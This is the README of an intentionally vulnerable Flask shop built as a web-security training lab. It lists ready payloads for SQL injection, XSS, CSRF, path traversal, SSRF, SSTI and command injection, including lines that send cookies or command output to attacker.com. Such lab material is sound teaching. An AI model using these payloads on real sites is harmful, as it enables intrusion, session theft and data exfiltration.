# 🎯 VulnShop - Comprehensive Vulnerable E-Commerce Lab

## 🚀 Quick Start

1. **Install Dependencies:**
   ```bash
   python3 -m venv venv
   source venv/bin/activate
   pip install -r requirements.txt
   ```

2. **Start Application:**
   ```bash
   python app.py
   ```

3. **Access Application:**
   - URL: http://localhost:5001
   - Admin: `admin` / `admin123`
   - User: `john_doe` / `password123`

## 🎯 Complete Vulnerability Matrix

| # | Vulnerability | Location | Test Method | Impact |
|---|--------------|----------|-------------|---------|
| 1 | **SQL Injection** | `/login` | `' OR '1'='1' --` | Critical - Full DB access |
| 2 | **XSS (Stored)** | Product comments | `<script>alert('XSS')</script>` | High - Session hijacking |
| 3 | **Business Logic** | Coupon system | Reuse same coupon | Medium - Financial loss |
| 4 | **IDOR** | `/receipt/<id>` | Change ID in URL | High - Data breach |
| 5 | **CSRF** | `/change_password` | Malicious form | Medium - Account takeover |
| 6 | **Directory Traversal** | `/view_file` | `../../../etc/passwd` | High - File system access |
| 7 | **SSRF** | `/check_url` | Internal URLs | High - Internal network access |
| 8 | **SSTI** | `/render_template` | `{{ 7*7 }}` | Critical - RCE |
| 9 | **Command Injection** | `/ping` | `; whoami` | Critical - System compromise |
| 10 | **Broken Auth** | `/admin` | Direct access | High - Admin access |
| 11 | **Insecure Deserialization** | User preferences | Pickle payload | Critical - RCE |
| 12 | **Information Disclosure** | Debug mode | SQL error messages | Medium - Info leak |

## 🛠️ Project Structure

```
VulnShop/
├── app.py                          # Main vulnerable Flask application
├── requirements.txt                # Python dependencies
├── start.sh                       # Quick start script
├── README.md                      # Comprehensive documentation
├── PENETRATION_TESTING_GUIDE.md   # Detailed testing guide
├── Dockerfile                     # Container deployment
├── docker-compose.yml            # Multi-container setup
├── templates/                     # HTML templates
│   ├── base.html                 # Base template with navigation
│   ├── home.html                # Product catalog & testing tools
│   ├── login.html               # Login page (SQL injection)
│   ├── product.html             # Product details (XSS comments)
│   ├── dashboard.html           # User dashboard
│   ├── receipt.html             # Receipt viewer (IDOR)
│   ├── change_password.html     # Password change (CSRF)
│   ├── ssti_form.html           # Template injection testing
│   ├── file_viewer.html         # File viewer (LFI)
│   └── admin.html               # Admin panel (broken auth)
├── exploits/                     # Exploitation scripts
│   ├── sqli_exploit.py          # SQL injection tester
│   ├── idor_exploit.py          # IDOR enumeration
│   ├── csrf_exploit.py          # CSRF attack generator
│   ├── directory_traversal_exploit.py # LFI tester
│   └── csrf_demo.html           # Interactive CSRF demo
├── test_all_vulnerabilities.py   # Comprehensive security test
└── uploads/                      # File upload directory
```

## 🧪 Testing Scenarios

### 1. **SQL Injection (Critical)**
```bash
# Login bypass
Username: ' OR '1'='1' --
Password: anything

# Union-based injection
Username: ' UNION SELECT 1,username,password,4,5 FROM users --
```

### 2. **Cross-Site Scripting**
```html
<!-- In product comments -->
<script>alert('XSS')</script>
<img src=x onerror=alert('Cookie: '+document.cookie)>
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
```

### 3. **IDOR (Insecure Direct Object References)**
```bash
# Access other users' receipts
http://localhost:5001/receipt/1
http://localhost:5001/receipt/2
http://localhost:5001/receipt/3
# Run: python exploits/idor_exploit.py
```

### 4. **CSRF (Cross-Site Request Forgery)**
```html
<!-- Host this on different domain -->
<form action="http://localhost:5001/change_password" method="post">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="submit" value="Click me!">
</form>
<script>document.forms[0].submit();</script>
```

### 5. **Directory Traversal/LFI**
```bash
http://localhost:5001/view_file?file=../../../etc/passwd
http://localhost:5001/view_file?file=../app.py
http://localhost:5001/download/../../../etc/hosts
```

### 6. **SSRF (Server-Side Request Forgery)**
```bash
# Internal network scanning
http://127.0.0.1:22
http://localhost:3306
file:///etc/passwd
http://169.254.169.254/latest/meta-data/
```

### 7. **SSTI (Server-Side Template Injection)**
```python
# Basic detection
{{ 7*7 }}

# Command execution
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}

# File reading
{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
```

### 8. **Command Injection**
```bash
# In ping functionality
127.0.0.1; whoami
127.0.0.1 && cat /etc/passwd
127.0.0.1; curl http://attacker.com/$(whoami)
```

### 9. **Business Logic Flaw**
```bash
# Coupon abuse - use same coupon multiple times
Coupon: SAVE10 (10% discount)
Coupon: WELCOME20 (20% discount)  
Coupon: MEGA50 (50% discount)
```

### 10. **Broken Authentication**
```bash
# Admin panel without authentication
http://localhost:5001/admin
```

## 🔧 Automated Testing

### Run All Tests
```bash
python test_all_vulnerabilities.py
```

### Individual Exploits
```bash
python exploits/sqli_exploit.py
python exploits/idor_exploit.py
python exploits/directory_traversal_exploit.py
python exploits/csrf_exploit.py html
```

## 🐳 Docker Deployment

```bash
# Build and run with Docker Compose
docker-compose up --build

# Access application
http://localhost:5001

# Access attacker server (for CSRF demos)
http://localhost:8080
```

## 🎓 Educational Value

This lab teaches:

1. **Manual Testing Techniques** - How to identify and test for common vulnerabilities
2. **Automated Testing** - Using scripts and tools for vulnerability assessment
3. **Impact Assessment** - Understanding the business impact of security flaws
4. **Remediation Strategies** - How to fix each type of vulnerability
5. **Real-world Attack Scenarios** - Practical exploitation techniques

## ⚠️ Security Warnings

**CRITICAL WARNINGS:**
- Contains **intentional critical vulnerabilities**
- **NEVER deploy in production**
- Use only in **isolated environments**
- For **educational purposes only**

**Safe Usage:**
- Local development environments
- Isolated virtual machines
- Educational lab networks
- Security training sessions

## 🏆 Achievement Unlocks

Try to find and exploit all vulnerabilities:

- [ ] SQL Injection bypass login
- [ ] XSS cookie stealing
- [ ] IDOR data enumeration  
- [ ] CSRF password change
- [ ] Directory traversal file access
- [ ] SSRF internal network scan
- [ ] SSTI remote code execution
- [ ] Command injection system access
- [ ] Business logic coupon abuse
- [ ] Admin panel unauthorized access
- [ ] Insecure deserialization exploit
- [ ] Information disclosure via errors

## 🤝 Contributing

Want to add more vulnerabilities or improve existing ones?

1. Fork the repository
2. Create a feature branch
3. Add new vulnerabilities or improve documentation
4. Test thoroughly in isolated environment
5. Submit a pull request

**Ideas for additional vulnerabilities:**
- XXE (XML External Entity)
- JWT vulnerabilities
- Race conditions
- NoSQL injection
- LDAP injection
- Clickjacking
- HTTP Parameter Pollution

## 📚 Learning Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Burp Suite Learning Resources](https://portswigger.net/burp/documentation)

## 💡 Tips for Success

1. **Start with reconnaissance** - Map the application first
2. **Use multiple testing methods** - Manual + automated
3. **Document everything** - Keep detailed notes
4. **Understand impact** - Don't just find bugs, understand their business impact
5. **Practice remediation** - Try to fix the vulnerabilities you find
6. **Use proper tools** - Burp Suite, OWASP ZAP, custom scripts

---

**Happy Hacking! 🔐**

*Remember: Use this knowledge responsibly and only on systems you own or have explicit permission to test.*
